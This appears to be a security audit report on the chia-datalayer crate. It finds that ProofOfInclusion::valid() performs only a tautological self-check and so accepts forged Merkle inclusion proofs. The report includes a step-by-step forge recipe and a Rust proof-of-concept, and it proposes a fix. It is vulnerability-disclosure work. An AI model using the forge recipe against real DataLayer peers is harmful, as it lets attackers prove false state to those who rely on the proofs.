### Title
`ProofOfInclusion::valid()` Is a Tautological Self-Check That Never Verifies Against a Trusted Root — Forged Inclusion Proofs Always Pass - (File: crates/chia-datalayer/src/merkle/proof_of_inclusion.rs)

### Summary

`ProofOfInclusion::valid()` in the DataLayer crate contains a logical flaw: the final comparison `existing_hash == self.root_hash()` is a tautology. After the loop, `existing_hash` is guaranteed to equal `layers.last().combined_hash`, and `root_hash()` returns exactly that same field. The method therefore only checks internal self-consistency of the proof object, never comparing the computed root against any external trusted root. An attacker can construct a `ProofOfInclusion` with an arbitrary `node_hash` (claiming any key/value is in the tree), build internally consistent layers, and `valid()` returns `true`.

### Finding Description

`ProofOfInclusion` is a `Streamable` type exposed through both Rust and Python/WASM bindings. Its `valid()` method is the sole public API for verifying a proof:

```rust
// crates/chia-datalayer/src/merkle/proof_of_inclusion.rs

pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash          // ← returns the proof's OWN last combined_hash
    } else {
        self.node_hash
    }
}

pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;   // ← existing_hash := layer.combined_hash
    }

    existing_hash == self.root_hash()      // ← TAUTOLOGY
}
```

**Why it is a tautology:** After the loop completes without returning `false`, `existing_hash` holds the last `calculated_hash`, which the loop already verified equals `layer.combined_hash` for the last layer. `self.root_hash()` returns `layers.last().combined_hash` — the exact same value. The final comparison is therefore always `true` when the loop exits normally.

The method never accepts an external trusted root as a parameter and never compares the computed root against one. `root_hash()` derives the root entirely from attacker-controlled fields inside the proof object itself.

**Forge recipe (zero cryptographic work required):**
1. Choose any target `node_hash` (e.g., the hash of a key/value pair not in the tree).
2. Choose any `other_hash` and `other_hash_side`.
3. Compute `combined_hash = calculate_internal_hash(node_hash, other_hash_side, other_hash)`.
4. Construct `ProofOfInclusion { node_hash, layers: [ProofOfInclusionLayer { other_hash_side, other_hash, combined_hash }] }`.
5. `proof.valid()` returns `true`. `proof.root_hash()` returns the attacker-chosen `combined_hash`.

The type is `Streamable`, so it can be deserialized from bytes via `from_bytes()` and transmitted over the network to any peer that calls `valid()`.

### Impact Explanation

Any DataLayer consumer that receives a `ProofOfInclusion` from an untrusted source and calls `valid()` to gate access decisions will accept a forged proof. The DataLayer's purpose is to commit key-value state on-chain via a Merkle root; proofs are the mechanism by which peers verify that a specific key/value pair belongs to a committed root. A forged proof that passes `valid()` lets an attacker assert arbitrary key/value membership against any committed root, proving invalid state. This matches the allowed High impact: "DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."

### Likelihood Explanation

`ProofOfInclusion` is a `Streamable` type with `from_bytes()` exposed in both Rust and Python bindings. The `valid()` method is the only verification primitive provided; no alternative API requires passing a trusted root. All existing call sites (fuzz target, tests, Python tests) call `valid()` alone without a separate root comparison, establishing the pattern that `valid()` is a complete check. Any DataLayer peer that follows this pattern when verifying externally-supplied proofs is immediately exploitable by an unprivileged attacker who can send crafted bytes.

### Recommendation

`valid()` must accept a trusted external root hash and compare the computed root against it:

```rust
pub fn valid(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    &existing_hash == trusted_root   // compare against caller-supplied trusted root
}
```

Alternatively, keep the current signature but rename it to `is_internally_consistent()` and add a separate `verify(trusted_root: &Hash) -> bool` that performs the external root comparison. Update all call sites — including the Python binding `py_valid` — to require the trusted root.

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side, MerkleBlob, KeyId, ValueId, InsertLocation};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};
use chia_datalayer::calculate_internal_hash;
use chia_protocol::Bytes32;

fn main() {
    // Build a real tree with one entry
    let mut blob = MerkleBlob::new(Vec::new()).unwrap();
    let real_hash = Hash(Bytes32::new([0xAA; 32]));
    blob.insert(KeyId(1), ValueId(1), &real_hash, InsertLocation::Auto {}).unwrap();
    blob.calculate_lazy_hashes().unwrap();
    let real_root = blob.get_root().unwrap(); // the committed on-chain root

    // Forge a proof claiming KeyId(999)/ValueId(999) is in the tree — it is NOT
    let fake_node_hash = Hash(Bytes32::new([0xFF; 32])); // hash of non-existent entry
    let other_hash    = Hash(Bytes32::new([0x11; 32]));
    let combined_hash = calculate_internal_hash(&fake_node_hash, Side::Right, &other_hash);

    let forged_proof = ProofOfInclusion {
        node_hash: fake_node_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Right,
            other_hash,
            combined_hash,
        }],
    };

    // valid() returns true — forged proof accepted
    assert!(forged_proof.valid());

    // The forged proof's root_hash() does NOT equal the real committed root,
    // but valid() never checks that — it only checks internal consistency.
    assert_ne!(forged_proof.root_hash(), real_root);

    println!("Forged proof passes valid() despite not matching the committed root.");
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L31-58)
```rust
impl ProofOfInclusion {
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }

    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L57-62)
```rust
pub fn calculate_internal_hash(hash: &Hash, other_hash_side: Side, other_hash: &Hash) -> Hash {
    match other_hash_side {
        Side::Left => internal_hash(other_hash, hash),
        Side::Right => internal_hash(hash, other_hash),
    }
}
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L1155-1195)
```rust
    pub fn get_proof_of_inclusion(
        &self,
        key: KeyId,
    ) -> Result<proof_of_inclusion::ProofOfInclusion, Error> {
        let mut index = *self
            .block_status_cache
            .get_index_by_key(key)
            .ok_or(Error::UnknownKey(key))?;

        let node = self
            .get_node(index)?
            .expect_leaf("key to index mapping should only have leaves");

        let parents = self.get_lineage_blocks_with_indexes(index)?;
        let mut layers: Vec<proof_of_inclusion::ProofOfInclusionLayer> = Vec::new();
        let mut parents_iter = parents.iter();
        // first in the lineage is the index itself, second is the first parent
        parents_iter.next();
        for (next_index, block) in parents_iter {
            if block.metadata.dirty {
                return Err(Error::Dirty(*next_index));
            }
            let parent = block
                .node
                .expect_internal("all nodes after the first should be internal");
            let sibling_index = parent.sibling_index(index)?;
            let sibling_block = self.get_block(sibling_index)?;
            let sibling = sibling_block.node;
            let layer = proof_of_inclusion::ProofOfInclusionLayer {
                other_hash_side: parent.get_sibling_side(index)?,
                other_hash: sibling.hash(),
                combined_hash: parent.hash,
            };
            layers.push(layer);
            index = *next_index;
        }

        Ok(proof_of_inclusion::ProofOfInclusion {
            node_hash: node.hash,
            layers,
        })
```

**File:** wheel/python/chia_rs/datalayer.pyi (L237-266)
```text
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** crates/chia-datalayer/fuzz/fuzz_targets/proofs_of_inclusion.rs (L28-31)
```rust
    for key in keys {
        let proof = blob.get_proof_of_inclusion(key).unwrap();
        assert!(proof.valid());
    }
```
